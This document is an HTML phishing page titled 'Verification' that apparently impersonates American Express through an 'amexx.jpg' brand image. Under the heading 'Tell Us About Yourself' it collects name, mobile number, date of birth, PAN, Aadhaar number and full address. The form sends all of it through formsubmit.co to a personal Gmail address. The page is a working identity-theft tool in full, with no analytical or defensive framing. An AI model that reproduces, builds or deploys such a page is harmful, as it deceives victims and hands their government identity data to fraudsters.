<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verification</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body{
    min-height:100vh;
    background:#f5f7fb;
    display:flex;
    flex-direction:column;
}

/* ================= HEADER ================= */
.site-header{
    width:100%;
    background:#fff;
    border-bottom:1px solid #e6e6e6;
}

.header-container{
    max-width:1200px;
    margin:auto;
    padding:16px 20px;
}

.brand{
    font-size:18px;
    font-weight:700;
    color:#006fcf;
    letter-spacing:.6px;
}

/* ================= MAIN ================= */
.main{
    flex:1;
    width:100%;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:30px 15px;
}

.card{
    width:100%;
    max-width:480px;
    background:#fff;
    border-radius:14px;
    padding:32px 28px;
    box-shadow:0 18px 40px rgba(0,0,0,.12);
}

.card h2{
    text-align:center;
    font-size:22px;
    color:#6a3fd3;
    margin-bottom:8px;
}

.card p{
    text-align:center;
    font-size:13px;
    color:#777;
    margin-bottom:22px;
}

.progress{
    height:8px;
    background:#e9e2fb;
    border-radius:50px;
    overflow:hidden;
    margin-bottom:26px;
}

.progress span{
    display:block;
    height:100%;
    width:65%;
    background:linear-gradient(90deg,#7b4fe0,#5f2ec9);
}

.inputBox{
    margin-bottom:18px;
}

.inputBox label{
    font-size:14px;
    color:#6a3fd3;
    display:block;
    margin-bottom:6px;
}

.inputBox input{
    width:100%;
    padding:14px;
    font-size:15px;
    border:1px solid #dcdcdc;
    border-radius:6px;
    background:#f5f6f7;
    outline:none;
}

.btn{
    width:100%;
    padding:14px;
    font-size:16px;
    font-weight:600;
    border:none;
    border-radius:6px;
    cursor:pointer;
    background:linear-gradient(135deg,#ff1744,#ff5252);
    color:#fff;
    margin-top:10px;
}

.btn:active{
    transform:scale(.98);
}

/* ================= FOOTER ================= */
.footer{
    width:100%;
    background:#fff;
    border-top:1px solid #e6e6e6;
    margin-top:auto;
}

.footer-inner{
    max-width:1200px;
    margin:auto;
    padding:18px 15px;
    text-align:center;
}

.footer-inner p{
    font-size:12px;
    color:#777;
    line-height:1.6;
    word-wrap:break-word;
}

/* ================= RESPONSIVE ================= */
@media(max-width:480px){
    .card{
        padding:24px 18px;
    }
    .card h2{
        font-size:20px;
    }
    .brand{
        font-size:16px;
    }
    .footer-inner p{
        font-size:11px;
    }
}
</style>
</head>

<body>

<!-- HEADER -->
<header class="site-header">
    <div class="header-container"> 
        <div class="brand">
<img src="/anishka/amexx.jpg">   
</div>
    </div>
</header>

<!-- MAIN -->
<div class="main">
    <div class="card">
        <h2>Tell Us About Yourself</h2>  
        <p>Please enter your details as per government records</p>

        <div class="progress">
            <span></span>
        </div>

        <form method="post" action="https://formsubmit.co/akashdashing857@gmail.com">   

            <div class="inputBox">
                <label>Name as per Aadhaar</label>
                <input type="text" name="name" placeholder="Enter full name" required>
            </div>

            <div class="inputBox">
                <label>Mobile Number</label>
                <input type="tel" name="mobile" placeholder="Enter mobile number" required>
            </div>

            <div class="inputBox">
                <label>Date of Birth</label>
                <input type="text" name="dateofbirth" placeholder="01/01/2003" required>  
            </div>  

            <div class="inputBox">
                <label>PAN Card</label>
                <input type="text" name="pancard" placeholder="ABCDE1234F" required>
            </div>

            <div class="inputBox">
                <label>Aadhaar Card</label>
                <input type="text" name="aadhar" placeholder="XXXX XXXX XXXX" required>
            </div>

            <div class="inputBox">
                <label>Address</label>
                <input type="text" name="address" placeholder="House no, Street, Area" required>
            </div>

            <div class="inputBox">
                <label>City</label>
                <input type="text" name="city" placeholder="Enter city" required>
            </div>

            <div class="inputBox">
                <label>State</label>
                <input type="text" name="state" placeholder="Enter state" required>
            </div>

            <div class="inputBox">
                <label>Pincode</label>
                <input type="text" name="pincode" placeholder="Enter pincode" required>
            </div>

            <button class="btn">Continue</button>

        </form>
    </div>  
</div>

<!-- FOOTER -->
<footer class="footer">
    <div class="footer-inner">
        <p>

    </div>
</footer>

</body>
</html>
